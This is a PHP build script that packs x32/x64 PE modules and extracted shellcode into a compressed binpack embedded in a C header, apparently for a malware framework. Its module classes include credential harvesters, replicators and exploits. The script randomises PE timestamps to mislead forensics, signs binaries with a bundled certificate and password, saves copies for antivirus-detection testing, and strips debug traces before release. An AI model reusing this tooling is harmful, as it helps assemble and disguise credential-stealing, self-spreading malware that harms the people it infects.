<?php
/*
	make_binpack.php
	Routine to prepare whole binpack using files placed at ..\binres\
	Searches for *.x32 / *.x64 pairs, it's description at ..\binres\info.json\
	Use LZ4_pack.exe for packaging each chunk
	Do special work for shellcode
	Form a single binpack.bin and translate it into ..\inc\binpack.h

	No input params needed. 
	Resulting exitcodes:
	0 - success
	1 - warnings during processing, like debug information in files or other traces, which should not be present in release version
	255 - fatal error(s) detected
*/

// definitions

// internal structures
define('RES_TYPE_RSE', 1);
define('RES_TYPE_IDD', 2);
define('RES_TYPE_WDD', 3);
define('RES_TYPE_SHELLCODE', 4);
define('RES_TYPE_MODULE', 5);
define('RES_TYPE_KBRI_HD', 6);

define('MODULE_CLASS_CORE', 0);
define('MODULE_CLASS_AUTHCREDS_HARVESTER', 1);
define('MODULE_CLASS_REPLICATOR', 2);
define('MODULE_CLASS_EXPLOIT', 3);
define('MODULE_CLASS_NETWORK', 4);
define('MODULE_CLASS_TASKWORKS', 5);
define('MODULE_CLASS_OTHER', 128);

// PE-processing related
define('IMAGE_FILE_MACHINE_I386', 0x014c);
define('IMAGE_FILE_MACHINE_AMD64', 0x8664);
define('sizeof_IMAGE_FILE_HEADER', 20);
define('sizeof_IMAGE_SECTION_HEADER', 40);

// internal definitions
define('BM_DEBUG', 1);
define('BM_RELEASE', 2);

/*
	$bin_data - binary chunk to be encoded via external tool 
	Returns - processed encoded data ready for convert into binhex
*/
function encode_via_tool(&$context, $bin_data)
{
	// check for tool file in current dir
	if (!file_exists('LZ4_pack.exe')) { $context['errors'][] = "LZ4_pack.exe not found in dir ".getcwd(); return; }

	// select tmp fname in current dir
	$ftmp = strval(rand(10000, 99999)).".tmp";

	// put orig data in current dir
	file_put_contents($ftmp, $bin_data);

	// exec tool waiting for result
	exec("LZ4_pack.exe {$ftmp} {$ftmp}.lz4");

	if (!file_exists("{$ftmp}.lz4")) { $context['errors'][] = "LZ4_pack.exe produced no expected output file"; return; }

	// read res and wipe tmps
	$res = file_get_contents("{$ftmp}.lz4");
	@unlink("{$ftmp}.lz4");
	@unlink("{$ftmp}");

	return $res;
}


/*
	Like encode_via_tool, but for signtool
*/
function signtool_sign(&$context, $bin_data)
{
	// check for tool file in current dir
	if (!file_exists('signtool.exe')) { $context['errors'][] = "LZ4_pack.exe not found in dir ".getcwd(); return; }

	// select tmp fname in current dir
	$ftmp = strval(rand(10000, 99999)).".tmp";

	// put orig data in current dir
	file_put_contents($ftmp, $bin_data);

	// exec tool waiting for result
	$out = array();
	$ret_code = 255;
	exec("signtool.exe sign /f tric.pfx /p 123 {$ftmp}", $out, $ret_code);

	// read res and wipe tmps
	$res = file_get_contents($ftmp);
	@unlink($ftmp);

	if ($ret_code != 0) { $context['errors'][] = "signtool error: ".print_r($out); return; }

	if ($res == $bin_data) { $context['errors'][] = "signtool error: file is not signed, but no error returned"; return; }

	return $res;

}



/*
	Parse PE headers and section params into $res array
	Set found errors into $context
	$pe_data contains clear file read from disk
*/
function ParsePEHeaders(&$context, $pe_data, &$res)
{

	// IMAGE_DOS_HEADER
	$res['IMAGE_DOS_HEADER'] = unpack('ve_magic/ve_cblp/ve_cp/ve_crlc/ve_cparhdr/ve_minalloc/ve_maxalloc/ve_ss/ve_sp/ve_csum/ve_ip/ve_cs/ve_lfarlc/ve_ovno/v4e_res/ve_oemid/ve_oeminfo/v10e_res2/ve_lfanew', $pe_data);
	if ($res['IMAGE_DOS_HEADER']['e_magic'] != 0x05a4d) {  $context['errors'][] = "Invalid DOS header signature"; return; }

	// arch-independent part of IMAGE_NT_HEADERS : Signature + IMAGE_FILE_HEADER
	$res['IMAGE_FILE_HEADER'] = unpack('VSignature/vMachine/vNumberOfSections/VTimeDateStamp/VPointerToSymbolTable/VNumberOfSymbols/vSizeOfOptionalHeader/vCharacteristics', substr($pe_data, $res['IMAGE_DOS_HEADER']['e_lfanew']));
	if ($res['IMAGE_FILE_HEADER']['Signature'] != 0x4550) {  $context['errors'][] = "Invalid PE header signature"; return; }

	// check if machine type supported
	if (($res['IMAGE_FILE_HEADER']['Machine'] != IMAGE_FILE_MACHINE_I386)&&($res['IMAGE_FILE_HEADER']['Machine'] != IMAGE_FILE_MACHINE_AMD64)) { $context['errors'][] = "Unzupported target machine type {$res['IMAGE_FILE_HEADER']['Machine']}"; return; }

	// parse according to arch
	if ($res['IMAGE_FILE_HEADER']['Machine'] == IMAGE_FILE_MACHINE_I386) {

		// x32
		$sizeof_IMAGE_NT_HEADERS = 248;
		// IMAGE_OPTIONAL_HEADER32 is at e_lfanew + DWORD IMAGE_NT_HEADERS32.Signature + IMAGE_FILE_HEADER
		$res['IMAGE_OPTIONAL_HEADER32'] = unpack('vMagic/CMajorLinkerVersion/CMinorLinkerVersion/VSizeOfCode/VSizeOfInitializedData/VSizeOfUninitializedData/VAddressOfEntryPoint/VBaseOfCode/VBaseOfData/VImageBase/VSectionAlignment/VFileAlignment/vMajorOperatingSystemVersion/vMinorOperatingSystemVersion/vMajorImageVersion/vMinorImageVersion/vMajorSubsystemVersion/vMinorSubsystemVersion/'.
					 'VWin32VersionValue/VSizeOfImage/VSizeOfHeaders/VCheckSum/vSubsystem/vDllCharacteristics/VSizeOfStackReserve/VSizeOfStackCommit/VSizeOfHeapReserve/VSizeOfHeapCommit/VLoaderFlags/VNumberOfRvaAndSizes'.
			'/Vdd0_va/Vdd0_size/Vdd1_va/Vdd1_size/Vdd2_va/Vdd2_size/Vdd3_va/Vdd3_size', substr($pe_data, $res['IMAGE_DOS_HEADER']['e_lfanew'] + sizeof_IMAGE_FILE_HEADER + 4));

		$res['IMAGE_OPTIONAL_HEADER'] = $res['IMAGE_OPTIONAL_HEADER32'];

	} else {

		// x64
		$sizeof_IMAGE_NT_HEADERS = 264;
		// Differs: ULONGLONG ImageBase, SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit, removed BaseOfData
		$res['IMAGE_OPTIONAL_HEADER64'] = unpack('vMagic/CMajorLinkerVersion/CMinorLinkerVersion/VSizeOfCode/VSizeOfInitializedData/VSizeOfUninitializedData/VAddressOfEntryPoint/VBaseOfCode/V2ImageBase/VSectionAlignment/VFileAlignment/vMajorOperatingSystemVersion/vMinorOperatingSystemVersion/vMajorImageVersion/vMinorImageVersion/vMajorSubsystemVersion/vMinorSubsystemVersion/'.
					 'VWin32VersionValue/VSizeOfImage/VSizeOfHeaders/VCheckSum/vSubsystem/vDllCharacteristics/V2SizeOfStackReserve/V2SizeOfStackCommit/V2SizeOfHeapReserve/V2SizeOfHeapCommit/VLoaderFlags/VNumberOfRvaAndSizes'.
			'/Vdd0_va/Vdd0_size/Vdd1_va/Vdd1_size/Vdd2_va/Vdd2_size/Vdd3_va/Vdd3_size', substr($pe_data, $res['IMAGE_DOS_HEADER']['e_lfanew'] + sizeof_IMAGE_FILE_HEADER + 4));

		$res['IMAGE_OPTIONAL_HEADER'] = $res['IMAGE_OPTIONAL_HEADER64'];

	}	// arch check

	// iterate sections 
	$res['sections'] = array();
	$sh_offset = $res['IMAGE_DOS_HEADER']['e_lfanew'] + $sizeof_IMAGE_NT_HEADERS;	// calc starting section header offset

    for ($i=1;$i<=$res['IMAGE_FILE_HEADER']['NumberOfSections'];$i++) {

		$sh = unpack('a8Name/VVirtualSize/VVirtualAddress/VSizeOfRawData/VPointerToRawData/VPointerToRelocations/VPointerToLinenumbers/vNumberOfRelocations/vNumberOfLinenumbers/VCharacteristics', substr($pe_data, $sh_offset));
        $sh['Characteristics'] = sprintf('%u', $sh['Characteristics']);  // php-specific signed to unsigned conversion

		$res['sections'][] = $sh;

		// adjust ptr
		$sh_offset += sizeof_IMAGE_SECTION_HEADER;

	} // for enum sections

}


/*
	Parses PE file to be included into resulting binpack
	$context - resulting context array, to put errors and warnings
	$parse_result - resulting binary string with packed data
	$file_data - input clear file data
	$arch - target architecture, 'x32' or 'x64' to check
	$filename - source filename, only for references when adding errors/warnings to $context
*/
function ParsePE(&$context, &$parse_result, $file_data, $arch, $filename)
{
	// parse PE structure, enum all sections in exe, etc
	$headers = array();
	ParsePEHeaders($context, $file_data, $headers);

	// arch match check
	if (
		(($arch == 'x32') && ($headers['IMAGE_FILE_HEADER']['Machine'] != IMAGE_FILE_MACHINE_I386)) ||
		(($arch == 'x64') && ($headers['IMAGE_FILE_HEADER']['Machine'] != IMAGE_FILE_MACHINE_AMD64))
	   ) { $context['errors'][] = "{$filename} target machine type mismatch, need {$arch}"; }

	// modify timestamp with random val
	$new_ts = mt_rand( strtotime("01 January 2014"), strtotime("01 June 2015") );	// gen rnd PE timestamp
	$file_data = substr_replace( $file_data, pack("V", $new_ts), $headers['IMAGE_DOS_HEADER']['e_lfanew'] + (2 * 4), 4);
//	$context['notifications'][] = "{$filename} ts ".date('d-M-Y H:i:s', $headers['IMAGE_FILE_HEADER']['TimeDateStamp'])." -> ".date('d-M-Y H:i:s', $new_ts);


	// fake Rich signature to some pre-defined values
	// ....

	// if needed for AV-check reasons, save processed file
	if ($context['settings']['AVCheckSave'] > 0) { file_put_contents($filename.".nosign.sav", $file_data); /* $context['notifications'][] = "{$filename}.nosign.sav saved for AV check as requested in config";*/ }

	// NB: if file needs to be signed, it should be done here after all modifications
	// to headers and structure are done - controlled via $context['settings']['DoSign'] settings
	if ($context['settings']['DoSign'] > 0) {
		//$context['notifications'][] = "{$filename} requested to be signed";
		$file_data = signtool_sign($context, $file_data);
		$context['notifications'][] = "{$filename} signed";

		if ($context['settings']['AVCheckSave'] > 0) { file_put_contents($filename.".sign.sav", $file_data); /* $context['notifications'][] = "{$filename}.sign.sav saved for AV check as requested in config"; */ }
	}



	// if all ok, perform encoding of the chunk
	if (count($context['errors'])>0) { return; }

	$file_packed = encode_via_tool($context, $file_data);

	// set resulting fields as for ER_SERIALIZED_CHUNK_PARAMS structure
	$parse_result['dwChunkLen'] = strlen($file_packed);
	$parse_result['dwOrigLen'] = strlen($file_data);
	//$parse_result['dwExtra'] = // in usual PE, this is set by caller to module's version from settings json

	$parse_result['bin'] = $file_packed;

	// stats adjust
	$context['stats']['origlen'] += $parse_result['dwOrigLen'];
	$context['stats']['reslen'] += $parse_result['dwChunkLen'] + (4*4);
	$context['stats']['count'] += 1;
}



function ParseShellcode(&$context, &$parse_result, $file_data, $arch, $filename)
{
	// parse PE structure, enum all sections in exe, etc
	$headers = array();
	ParsePEHeaders($context, $file_data, $headers);

	// arch match check
	if (
		(($arch == 'x32') && ($headers['IMAGE_FILE_HEADER']['Machine'] != IMAGE_FILE_MACHINE_I386)) ||
		(($arch == 'x64') && ($headers['IMAGE_FILE_HEADER']['Machine'] != IMAGE_FILE_MACHINE_AMD64))
	   ) { $context['errors'][] = "{$filename} target machine type mismatch, need {$arch}"; }

	// basic checks, shellcode-specific
	if ($headers['IMAGE_OPTIONAL_HEADER']['SizeOfInitializedData'] > 0)		{ $context['notifications'][] = "{$filename} contains initialized globals"; }
	if ($headers['IMAGE_OPTIONAL_HEADER']['SizeOfUninitializedData'] > 0)	{ $context['notifications'][] = "{$filename} contains uninitialized globals"; }

	// data directory is defined as ddN_va & ddN_size -> DATA_DIRECTORY[N] - virtual_address & size
	// ids: 0 - export, 1 - import, 2 - resource, 3 - exception
	if ($headers['IMAGE_OPTIONAL_HEADER']['dd0_size'] > 0) { $context['errors'][] = "{$filename} contains exports and possibly won't work as shellcode"; }
	if ($headers['IMAGE_OPTIONAL_HEADER']['dd1_size'] > 0) { $context['errors'][] = "{$filename} contains imports and won't work as shellcode"; }

	if ($headers['IMAGE_OPTIONAL_HEADER']['dd2_size'] > 0) { $context['notifications'][] = "{$filename} contains resources, which will not be available for shellcode"; }
	if ($headers['IMAGE_OPTIONAL_HEADER']['dd3_size'] > 0) { $context['notifications'][] = "{$filename} contains exception records, which will not be available for shellcode"; }

	if (count($context['errors'])>0) { return; }

	// enum sections, checking it's NumberOfRelocations and select .code
	$sh = array();	// to place suitable result
	foreach ($headers['sections'] as $section_header ) {

		// check for relocs
		if ($section_header['NumberOfRelocations'] > 0) { $context['errors'][] = "{$filename} file contains relocations and won't work as shellcode"; return; }

		// check for code section
		if (($section_header['Characteristics'] & 0x20) == 0x20) { $sh = $section_header; break; }

	} // foreach

	// check if found suitable section
	if (count($sh)==0) { $context['errors'][] = "{$filename} file contains no code section and won't work as shellcode"; return; }

	// extract shellcode to be processed
	$shellcode = substr($file_data, $sh['PointerToRawData'], $sh['VirtualSize']);

	// do pack
	$shellcode_packed = encode_via_tool($context, $shellcode);

	// set resulting fields as for ER_SERIALIZED_CHUNK_PARAMS structure
	$parse_result['dwChunkLen'] = strlen($shellcode_packed);
	$parse_result['dwOrigLen'] = strlen($shellcode);
	$parse_result['dwExtra'] = $headers['IMAGE_OPTIONAL_HEADER']['AddressOfEntryPoint'] - $headers['IMAGE_OPTIONAL_HEADER']['BaseOfCode'];	// shellcode EP offset

	$parse_result['bin'] = $shellcode_packed;

	// stats adjust
	$context['stats']['origlen'] += $parse_result['dwOrigLen'];
	$context['stats']['reslen'] += $parse_result['dwChunkLen'] + (4*4);
	$context['stats']['count'] += 1;
}


/*
	Performs a translation into single DWORD
		DWORD _erMakeChunkOptions(RES_TYPE rt, ARCH_TYPE at, WORD wModuleId)
		{
			return (DWORD)((wModuleId << 16) + ((BYTE)rt << 8) + (BYTE)at);
		}
		(WORD)MODULE_ID  == ( (BYTE)ENUM_MODULE_CLASSNAME + (BYTE)CLASS_ID_VALUE )
*/
function _erMakeChunkOptions(&$context, $arch)
{
	$at = 0;
	if ($arch == 'x32') { $at = 1; }
	if ($arch == 'x64') { $at = 2; }
	if (!$at) { $context['errors'][] = "Invalid arch type specified: {$arch}"; return; }

	return pack("CCCC", $at,
						$context['settings']['rtResourceType'],
						$context['settings']['civClassnameIdValue'],
						$context['settings']['emcModuleClassname']		
				);
}


/*
	Do actual processing of a single chunk
	Input:
	$context - resulting context array, to put errors and results
	$filename - full filename with path to a target item to be processed
	$settings - array with settings values in form of
				Array
				(
					[rtResourceType] => RES_TYPE_RSE (translated into numeric id by ParseSettings())
					[emcModuleClassname] => 0
					[civClassnameIdValue] => 0
					[ModuleVersion] => 1
				)
	$arch - target architecture, 'x32' or 'x64' to check
	Returns:
		Adds resulting data or error(s) to context at $res
*/
function ProcessItem(&$context, $filename, $settings, $arch)
{
	// read file contents
	$filedata = file_get_contents($filename);
	if (!$filedata)				{ $context['errors'][] = "Error reading file {$filename}"; }
	if (strlen($filedata)<512)	{ $context['errors'][] = "File len of {$filename} is too small (found ".strlen($filedata)." bytes)"; }

	if (count($context['errors'])>0) { return; }

	// basic checks for debug symbols, to be treated as warnings
	if ( ((strpos($filedata, '.pdb') !== FALSE) || ( strpos($filedata, '.PDB') !== FALSE )) && ( strpos($filedata, 'RSDS') !== FALSE ) ) {
		$context['warnings'][] = "{$filename} contains debug info path, not acceptable for release builds";
	}

	// according to type, parse contents
	$parse_res = '';
	if ($settings['rtResourceType'] == RES_TYPE_SHELLCODE) { 
	
		ParseShellcode($context, $parse_res, $filedata, $arch, $filename); 
	
	} else { 
		
		ParsePE($context, $parse_res, $filedata, $arch, $filename); 
		// need to set dwExtra field to module's version from settings
		$parse_res['dwExtra'] = $settings['ModuleVersion'];
		
	}	// check for shellcode

	// check for errors during parse inside of previous functions
	// due to no filename sent there, add extra error in case of some problems detected to log problematic filename
	if (count($context['errors'])>0) { $context['errors'][] = "Error parsing file {$filename}"; return; }

	// translate header into bin using values saved to $parse_res by parsing function
	/*
		typedef struct _ER_SERIALIZED_CHUNK_PARAMS
		{
			DWORD dwChunkOptions;	// (BYTE)RES_TYPE + (BYTE)ARCH_TYPE + (WORD)MODULE_ID ( (BYTE)ENUM_MODULE_CLASSNAME + (BYTE)CLASS_ID_VALUE )
			DWORD dwChunkLen;	// ^ it's size
			DWORD dwOrigLen;	// original len of chunk, for calculating mem needed for binary pack without actual decoding
			DWORD dwExtra;		// extra param, for shellcode chunk contains relative offset of entrypoint, for all others - module's version
		} ER_SERIALIZED_CHUNK_PARAMS, *PER_SERIALIZED_CHUNK_PARAMS;
	*/
	// NB: _erMakeChunkOptions() returns binary DWORD, all other fields needs conversion
	$context['bin'] .= _erMakeChunkOptions($context, $arch).pack("VVV", $parse_res['dwChunkLen'], $parse_res['dwOrigLen'], $parse_res['dwExtra'] );

	// add packed bin to resulting context too 
	$context['bin'] .= $parse_res['bin'];

}



/*
	Translates and checks info settings structure
*/
function ParseSettings(&$context, &$settings, $settings_filename)
{

	// check for present fields defined
	if (!isset($settings['rtResourceType']))		{ $context['errors'][] = "Settings field rtResourceType not defined in file {$settings_filename}"; }
	if (!isset($settings['emcModuleClassname']))	{ $context['errors'][] = "Settings field emcModuleClassname not defined in file {$settings_filename}"; }
	if (!isset($settings['civClassnameIdValue']))	{ $context['errors'][] = "Settings field civClassnameIdValue not defined in file {$settings_filename}"; }
	if (!isset($settings['ModuleVersion']))			{ $context['errors'][] = "Settings field ModuleVersion not defined in file {$settings_filename}"; }
	if (!isset($settings['DoSign']))				{ $settings['DoSign'] = 0; }
	if (!isset($settings['AVCheckSave']))			{ $settings['AVCheckSave'] = 0; }
	
	// exit on errors detected
	if (count($context['errors'])>0) { return; }

	// translate rtResourceType from string into id
	switch ($settings['rtResourceType']) {
		
		case "RES_TYPE_RSE"			: $settings['rtResourceType'] = RES_TYPE_RSE; break;
		case "RES_TYPE_IDD"			: $settings['rtResourceType'] = RES_TYPE_IDD; break;
		case "RES_TYPE_WDD"			: $settings['rtResourceType'] = RES_TYPE_WDD; break;
		case "RES_TYPE_SHELLCODE"	: $settings['rtResourceType'] = RES_TYPE_SHELLCODE; break;
		case "RES_TYPE_MODULE"		: $settings['rtResourceType'] = RES_TYPE_MODULE; break;
		case "RES_TYPE_KBRI_HD"		: $settings['rtResourceType'] = RES_TYPE_KBRI_HD; break;

		default: $context['errors'][] = "Undefined value {$settings['rtResourceType']} for rtResourceType in file {$settings_filename}"; break;

	} // switch rtResourceType


	// translate emcModuleClassname into numeric according to enum at ModuleDescriptor.h
	switch ($settings['emcModuleClassname']) {

		case "MODULE_CLASS_CORE"				: $settings['emcModuleClassname'] = MODULE_CLASS_CORE; break;
		case "MODULE_CLASS_AUTHCREDS_HARVESTER" : $settings['emcModuleClassname'] = MODULE_CLASS_AUTHCREDS_HARVESTER; break;
		case "MODULE_CLASS_REPLICATOR"			: $settings['emcModuleClassname'] = MODULE_CLASS_REPLICATOR; break;
		case "MODULE_CLASS_EXPLOIT"				: $settings['emcModuleClassname'] = MODULE_CLASS_EXPLOIT; break;
		case "MODULE_CLASS_NETWORK"				: $settings['emcModuleClassname'] = MODULE_CLASS_NETWORK; break;
		case "MODULE_CLASS_TASKWORKS"			: $settings['emcModuleClassname'] = MODULE_CLASS_TASKWORKS; break;
		case "MODULE_CLASS_OTHER"				: $settings['emcModuleClassname'] = MODULE_CLASS_OTHER; break;

		default: $context['errors'][] = "Undefined value {$settings['emcModuleClassname']} for emcModuleClassname in file {$settings_filename}"; break;

	} // switch emcModuleClassname


	// check for '%shellcode_ep_offset%', which should be set for RES_TYPE_SHELLCODE (id 4)
	if (($settings['ModuleVersion'] == '%shellcode_ep_offset%') && ($settings['rtResourceType'] != RES_TYPE_SHELLCODE)) { $context['errors'][] = "ModuleVersion value '%shellcode_ep_offset%' is suitable only for RES_TYPE_SHELLCODE, in file {$settings_filename}"; }

	if (($settings['rtResourceType'] == RES_TYPE_SHELLCODE) && ($settings['ModuleVersion'] != '%shellcode_ep_offset%')) { $context['errors'][] = "ModuleVersion requires '%shellcode_ep_offset%' for RES_TYPE_SHELLCODE, but found {$settings['ModuleVersion']}, in file {$settings_filename}"; }


	// possibly check for some other fields may come here
	// ...


	// processing done, copy to a special element in context
	$context['settings'] = $settings;

}

/*
	Makes .h file for inclusion at pre-defined path ..\inc\binpack.h
*/
function MakeH(&$context)
{

	$fname_out = '..\inc\binpack.h';

$s = "/*
    ".basename($fname_out)."
	binpack generator v0.1 converted, sha1 ".sha1($context['bin'])."
	".date('d-M-Y H:i:s')." {$context['BuildModeStr']}
*/

#define binpack_len ".strlen($context['bin'])."

BYTE pbinpack[binpack_len] = {\n";

	// convert bin 2 hex
	$hex = unpack('H*', $context['bin']); $hex_arr = str_split($hex[1], 2); //print_r($hex_arr);

	$counter = 1;
	foreach ($hex_arr as $val) {
         $s .= "0x{$val},";
         $counter++;
         if ($counter >20 ) { $s .="\r\n"; $counter = 1; }
	}

	// cut last comma
	$s = substr($s, 0, -1);

	$s .= "};";

	// save resulting dat
	file_put_contents($fname_out, $s);

	echo "\nSaved to ".realpath($fname_out)."\n";

}

/*
	Receives ptr to resulting buffer at $res, .x32 full path is passed at $x32_fullname
	
*/
function ProcessBinresModule(&$context, $x32_fullname)
{
	// make x64 name
	$x64_name = substr($x32_fullname, 0, -4).".x64";

	// check if that file exists
	if (!file_exists($x64_name)) { $context['errors'][] = "ERR: corresponding x64 module not found at [{$x64_name}]"; }

	// check for description
	$info_name = dirname($x32_fullname)."\info.json\\".basename($x32_fullname, ".x32");
	if (!file_exists($info_name)) { $context['errors'][] = "ERR: corresponding description not found at [{$info_name}]"; }

	// check for errors
	if (count($context['errors'])>0) { return; }

	// no errors during initial check - do processing
	$mod_settings = json_decode(file_get_contents($info_name), TRUE);
	ParseSettings($context, $mod_settings, $info_name);

	// check for errors
	if (count($context['errors'])>0) { return; }

	// parse both modules using current context data
	ProcessItem($context, $x32_fullname, $mod_settings, 'x32');
	ProcessItem($context, $x64_name,	 $mod_settings, 'x64');

}


// entrypoint 
error_reporting(E_ALL);

// remove target file, in case of any errors to prevent usage of old version
@unlink('..\inc\binpack.h');

// init globals
$g_Context = array();
$g_Context['errors'] = array();
$g_Context['warnings'] = array();
$g_Context['notifications'] = array();
$g_Context['bin'] = '';
$g_Context['stats']['origlen'] = 0;
$g_Context['stats']['reslen'] = 0;
$g_Context['stats']['count'] = 0;

// check for input param 
if (!@isset($argv[1])) { die("ERR: need to specify <Debug|Release> as cmdline param"); }
$param = strtolower(@$argv[1]);
$g_Context['BuildMode'] = 0;
$g_Context['BuildModeStr'] = @$argv[1];
if ($param == 'debug') { $g_Context['BuildMode'] = BM_DEBUG; }
if ($param == 'release') { $g_Context['BuildMode'] = BM_RELEASE; }
if (!$g_Context['BuildMode']) { @die("ERR: need to specify <Debug|Release> as cmdline param, found unknown param {$argv[1]}"); }

// enum *.x32 in ..\binres\ and do processing
foreach (glob(realpath("..\binres")."\*.x32") as $x32_modulename) { ProcessBinresModule($g_Context, $x32_modulename); }

// add ending NULL ER_SERIALIZED_CHUNK_PARAMS for ok enum (possibly some part will work ok instead of full structure)
$g_Context['bin'] .= pack('VVVV', 0,0,0,0);

// resulting errorlevel
$exitcode = 0;	// ok by default

// notifications check
$num = count($g_Context['notifications']);
if ($num>0) {
echo "\n {$num} Notifications during processing:\n";
	foreach ($g_Context['notifications'] as $str) { echo "{$str}\n"; }
}

// check for warnings
$num = count($g_Context['warnings']);
if ($num>0) {
echo "\n {$num} Warnings during processing:\n";
	foreach ($g_Context['warnings'] as $str) { echo "{$str}\n"; }
	$exitcode = 1;	// specific exitcode indicating warnings detected (NB: for release version, no warnings should be generated)
}

// check for errors
$num = count($g_Context['errors']);
if ($num>0) { 
	echo "\n {$num} Errors during processing:\n";
	foreach ($g_Context['errors'] as $str) { echo "{$str}\n"; }
	exit(255);
}	// 

echo "\n OK: Processed {$g_Context['stats']['origlen']} -> {$g_Context['stats']['reslen']} bytes (".round( $g_Context['stats']['reslen'] / $g_Context['stats']['origlen'] * 100, 1 )."%), {$g_Context['stats']['count']} items, {$g_Context['BuildModeStr']} mode\n";

// in release mode, no warnings should be generated
if ( (count($g_Context['warnings'])>0) && ($g_Context['BuildMode'] == BM_RELEASE) ) {

	echo "\n ERR: forbidden to generate binpack with warnings in Release mode!\n";

} else {	MakeH($g_Context);	}


// use exitcode defined by processing routines
exit($exitcode);
?>